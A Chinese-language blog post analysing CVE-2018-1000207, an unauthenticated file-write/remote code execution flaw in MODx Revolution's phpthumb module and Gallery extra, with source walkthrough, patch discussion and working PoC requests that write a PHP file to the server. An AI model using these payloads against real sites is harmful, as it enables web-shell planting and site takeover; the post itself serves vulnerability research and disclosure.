---
title: MODx Revolution 远程代码执行漏洞分析
date: 2018-07-20 17:44:56
tags: [vul,sec,Modx]
categories: Security
---

<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>

### 0x01 概述

近日，`MODx`官方发布通告称其`MODx Revolution 2.6.4`及之前的版本存在2个高危漏洞，攻击者可以通过该漏洞远程执行任意代码，从而获取网站的控制权或者删除任意文件。 本文分析其中的**CVE-2018-1000207**漏洞，并分别分析MODx 2.5.1和2.6.4版本漏洞形成原因和PoC构造。

### 0x02 环境搭建

分别安装`MODx 2.5.1`和`2.6.4`版本

### 0x03 漏洞分析

#### 2.5.1版本

漏洞发生在`phpthumb`模块，该模块的作用是提供缩略图对象

![1532080364911](https://ob5vt1k7f.qnssl.com/1532080364911.png)

当我们把光标放到文件系统中的图片上的时候，可以看到弹出了图片的缩略图，此时就调用了`phpthumb`接口

请求接口类似这样

`http://127.0.0.1/connectors/system/phpthumb.php?src=1.png&w=116&h=0&HTTP_MODAUTH=modx5b5067d920ba81.94108199_15b513c49743c49.16917110&f=png&q=90&wctx=mgr&source=1`

可以看到几个参数描述了图片的一些基本属性，这些属性在`core/model/phpthumb/phpthumb.class.php`中定义

```php
// public:
// START PARAMETERS (for object mode and phpThumb.php)
// See phpthumb.readme.txt for descriptions of what each of these values are
var $src  = null;     // SouRCe filename
var $new  = null;     // NEW image (phpThumb.php only)
var $w    = null;     // Width
var $h    = null;     // Height
var $wp   = null;     // Width  (Portrait Images Only)
var $hp   = null;     // Height (Portrait Images Only)
var $wl   = null;     // Width  (Landscape Images Only)
var $hl   = null;     // Height (Landscape Images Only)

// private: (should not be modified directly)
var $sourceFilename   = null;
var $rawImageData     = null;
var $IMresizedData    = null;
var $outputImageData  = null;
var $useRawIMoutput   = false;
```

从定义中也能看到，`phpthumb`提供了两种类型的参数：`public`和`private`

`public`就是普通属性，包括图片长宽高等，`private`则是一些私有属性，包括缓存目录，文件类型等，此次漏洞形成的关键就是程序并没有对两种类型的参数区分处理，以至于我们可以直接传入私有参数控制其中的变量值，从而改变程序执行逻辑。

当我们请求这个接口的时候，会访问`modSystemPhpThumbProcessor()`类，其中的`process()`方法：

```php
public function process() {
    $src = $this->getProperty('src');
    if (empty($src)) return $this->failure();

    $this->unsetProperty('src');

    $this->getSource($this->getProperty('source'));
    if (empty($this->source)) $this->failure($this->modx->lexicon('source_err_nf'));

    $src = $this->source->prepareSrcForThumb($src);
    if (empty($src)) return '';

    $this->loadPhpThumb();
    /* set source and generate thumbnail */
    $this->phpThumb->set($src);

    /* check to see if there's a cached file of this already */
    if ($this->phpThumb->checkForCachedFile()) {
        $this->phpThumb->loadCache();
        return '';
    }

    /* generate thumbnail */
    $this->phpThumb->generate();

    /* cache the thumbnail and output */
    $this->phpThumb->cache();
    $this->phpThumb->output();
    return '';
}
```

可以看到里面的几个主要操作，包括检查文件是否被缓存，以及读取缓存，设置缓存等，我们利用的就是`phpthumb`设置缓存的方法`phpThumb->cache()`

```php
public function cache() {
    phpthumb_functions::EnsureDirectoryExists(dirname($this->cache_filename));
    if ((file_exists($this->cache_filename) && is_writable($this->cache_filename)) || is_writable(dirname($this->cache_filename))) {
        $this->CleanUpCacheDirectory();
        if ($this->RenderToFile($this->cache_filename) && is_readable($this->cache_filename)) {
            chmod($this->cache_filename, 0644);
            $this->RedirectToCachedFile();
        }
    }
}
```

这里面关键的方法是`RenderToFile()`，可以看到它接收参数`$this->cache_filename`，那么我们可以直接传入`cache_filename`这个变量值。

```php
function RenderToFile($filename) {
    $renderfilename = $filename;
    //一系列检查
    if ($this->RenderOutput()) {
        if (file_put_contents($renderfilename, $this->outputImageData)) {
            $this->DebugMessage('RenderToFile('.$renderfilename.') succeeded', __FILE__, __LINE__);
            return true;
        }
    //...
    return false;
}
```

`RenderToFile()`方法里有`file_put_contents()`函数，文件名是我们传入的`cache_filename`，文件内容是`$this->outputImageData`。如果对内容没有校验的话意味着我们可以写入任意内容，前提是满足`$this->RenderOutput()`为真，进去看一下`RenderOutput()`

```php
function RenderOutput() {
    //...
    if ($this->useRawIMoutput) {
        $this->DebugMessage('RenderOutput copying $this->IMresizedData ('.strlen($this->IMresizedData).' bytes) to $this->outputImage', __FILE__, __LINE__);
        $this->outputImageData = $this->IMresizedData;
        return true;
    }
    //...
}
```

在这里我们需要满足`$this->useRawIMoutput`为真，而这个变量默认值为`false`。实际上`useRawIMoutput`即为我们提到的私有变量，程序虽然默认定义了私有变量的值，但我们还是可以通过`post`把值直接传进去，同时这里也没有检验文件的内容，直接把`$this->IMresizedData`赋值为`$this->outputImageData`，也就是`file_put_contents()`所需要的第二个参数，所以到这里就能构成一个任意文件写入的漏洞。

**构造PoC：**

`cache_filename=../../../payload.php&src=.&ctx=web&useRawIMoutput=1&config_prefer_imagemagick=0&outputImageData=<?php phpinfo();?>`

需要特别注意的是，此处的`cache_filename`与网站相对路径密切相关，往上目录穿越少了反而不能写入文件，而在Windows下测试可以写入Web根目录以外的目录，因为程序内部虽然检查了目录写权限，却并没有限制一个根目录，所以严格来说这里还存在一个目录穿越漏洞。

这个利用在MODX 2.5.1版本及之前可以无需登录直接利用，而在2.6.4版本进行了更严格的权限检查，在处理请求之前增加了这样一段判断代码：

`core/model/modx/modconnectorresponse.class.php` `outputContent()`方法

```php
/* Block the user if there's no user token for the current context, and permissions are in fact required */
if (empty($siteId) && (!defined('MODX_REQP') || MODX_REQP === TRUE)) {
    $this->responseCode = 401;
    $this->body = $modx->error->failure($modx->lexicon('access_denied'),array('code' => 401));
}
```

所以在2.6.4版本利用需要登录权限。



#### 2.6.4版本

那么有没有方法在2.6.4版本也能不需要权限直接写入任意文件呢？答案还是有的，只不过网站需要安装一个插件[Gallery](https://modx.com/extras/package/gallery)

> Gallery is a dynamic Gallery Extra for MODx Revolution. It allows you to quickly and easily put up galleries of images, sort them, tag them, and display them in a myriad of ways in the front-end of your site. 

简而言之`Gallery` 是一个图库，可以更方便地管理网站图片。

在这个库中也有`phpThumb`的相关方法，而且同样有缓存机制，不出意外同样存在任意文件写入漏洞，但是这个方法稍微复杂一些，它把文件写入cache目录，而文件名经过了一个array的反序列化再MD5，这样即使我们能写入文件，却猜不到文件名，因此a2u给出的PoC也没能直接写入文件，而是通过返回包来判断是否存在漏洞。但是经过分析，实际上我们是可以往缓存目录写入一个shell的，而且能够知道保存的文件名，下面来分析一下如何绕过这个看似复杂的流程。

![1532596628836](https://ob5vt1k7f.qnssl.com/1532596628836.png)

当利用插件上传图片的时候，如果图库中已经有图片，我们就可以看到一张缩略图，请求类似这样

`http://127.0.0.1/modx-2.6.4-pl/assets/components/gallery/connector.php?action=web/phpthumb&w=100&h=100&zc=1&src=/modx-2.6.4-pl/assets/gallery/1/cover.png&time=1532596253635`

同样的，`gallery`的`connector.php`也接收图片属性等`public`参数，但是此处我们并不关心，直接定位到处理写入缓存的文件`core/components/gallery/processors/web/phpthumb.php`。漏洞形成点同样也是`file_put_contents`参数没有经过过滤。

请求在进入`phpthumb.php`之后，首先会把参数设置成一个`array`，放在`$scriptProperties`中，类似这样

```php
array (
  'action' => 'web/phpthumb',
  'w' => '100',
  'h' => '100',
  'zc' => '1',
  'src' => '/modx-2.6.4-pl/assets/gallery/1/cover.png',
  'time' => '1532596253635',
)
```

在调用系统`phpthumb.class.php`模块的`RenderToFile`之前对文件进行了一系列处理，主要关注其中几个

首先对`src`文件后缀有一个判断

```php
if (empty($ptOptions['f'])) {
    $ext = pathinfo($src, PATHINFO_EXTENSION);
    $ext = strtolower($ext);
    switch ($ext) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
        case 'bmp':
            $ptOptions['f'] = $ext;
            break;
        default:
            $ptOptions['f'] = 'jpeg';
            break;
    }
}
```

如果没有指定`f`参数的话，就根据文件后缀将`f`赋值。也就是说，如果我们传递了`f`参数，也就可以指定任意文件后缀，此处没有任何过滤。

然后判断`src`参数是否是以`http`开头，如果不是，则把`src`拼接成完整的物理路径：`D:/phpStudy/PHPTutorial/WWW/modx-2.6.4-pl/assets/gallery/1/cover.png`

```php
/* auto-prepend base path if not a URL */
if (strpos($src, 'http') === false) {
    $basePath = $modx->getOption('base_path', null, MODX_BASE_PATH);
    if ($basePath != '/') {
        $src = str_replace(basename($basePath), '', $src);
        $src = ltrim($src, '/');
        $src = $basePath . $src;
    }
}
```

接着把`src`路径中的`:`和`/`替换成`_`，也就是`D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png`，这个字符串将成为最后缓存文件的文件名的前半部分。

```php
$inputSanitized = str_replace(array(':', '/'), '_', $src);
$cacheFilename = $inputSanitized;
$cacheFilename .= '.' . md5(serialize($scriptProperties));
$cacheFilename .= '.' . (!empty($ptOptions['f']) ? $ptOptions['f'] : 'png');
$cacheKey = $assetsPath . 'cache/' . $cacheFilename;
```

而文件名后半部分则是`md5(serialize($scriptProperties))`的值，把上面的array进行反序列化再MD5，最后拼接上面设置的`f`后缀，所以最后的文件名类似`D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png.0f0d6092657266f9718061fb8a20730d.png`，由于在实际利用中我们不知道网站物理路径，因此几乎无法猜出这个文件名。

**绕过方式就是利用`src`参数，上面代码对`src`进行了一个`http`判断，假如我们指定`src`以`http`开头，就不会拼接物理路径，而反序列化时的各个参数均是我们可以控制的，这样我们最终就能得到一个文件名类似`http.md5_string.php`的缓存文件。**

**构造PoC：**

`action=web/phpthumb&src=http&f=php&useRawIMoutput=1&config_prefer_imagemagick=0&IMresizedData=<?php phpinfo();?>`

然后写一段代码来生成反序列化数据，此处要注意参数顺序，不同顺序生成的反序列化数据不一样，最终的MD5值也就会变

```php
$target = array (
    "action"=> "web/phpthumb",
    "src"=> "http",
    "f"=> "php",
    "useRawIMoutput"=> "1",
    "config_prefer_imagemagick"=> "0",
    "IMresizedData"=> "<?php phpinfo();?>"
);
$seri = serialize($target);  
echo md5($seri);
```

最终会在缓存目录`assets/components/gallery/cache`写入文件`http.f23566b3b11f5fd29a8189b74ef53daf.php`

![1532601619133](https://ob5vt1k7f.qnssl.com/1532601619133.png)



### 0x04 补丁分析

https://github.com/modxcms/revolution/pull/13979/

![1532602450085](https://ob5vt1k7f.qnssl.com/1532602450085.png)

补丁主要是对可传入的参数进行了限制，只允许公共参数(public parameters)，这样就避免了直接传入私有参数改变程序逻辑。

### 0x05 总结

该漏洞的利用条件虽然有一定版本和插件限制，但是在互联网上`Gallery`插件的使用量并不小，相关站点需要多加防范。

此次漏洞应该归结于`phpthumb`模块，一是接口直接对外暴露，二是对文件操作缺少过滤。在`MODx`中的两个版本均受到影响，分别是 `1.7.14-201604151303`和`1.7.14-201608101311` ，在`Github`上搜索了几个使用该库的`CMS`，发现代码结构几乎一致，不排除也能直接利用的情况，有兴趣的可以研究一下。



<script>pangu.spacingPage();</script>